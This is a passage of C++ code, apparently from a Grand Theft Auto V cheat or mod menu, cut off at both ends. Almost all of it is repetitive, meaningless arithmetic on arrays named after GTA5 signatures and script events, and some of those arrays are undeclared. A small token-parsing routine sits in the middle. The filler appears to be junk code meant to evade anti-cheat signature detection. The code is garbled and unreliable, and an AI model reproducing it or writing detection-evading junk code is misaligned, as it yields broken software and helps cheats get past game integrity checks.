						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						if (Extern_Reader::StringManager::SeContemTexto(token, ","))
						{
							tokens.push_back(Extern_Reader::StringManager::ReplaceWord(token, ",", ""));
						}
						else if (Extern_Reader::StringManager::SeContemTexto(token, "}"))
						{
							tokens.push_back(Extern_Reader::StringManager::ReplaceWord(token, "}", ""));
						}
						else if (Extern_Reader::StringManager::SeContemTexto(token, "{"))
						{
							tokens.push_back(Extern_Reader::StringManager::ReplaceWord(token, "{", ""));
						}
						else if (Extern_Reader::StringManager::SeContemTexto(token, "   "))
						{
							tokens.push_back(Extern_Reader::StringManager::ReplaceWord(token, "   ", ""));
						}
						else
							tokens.push_back(token);
					}
					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
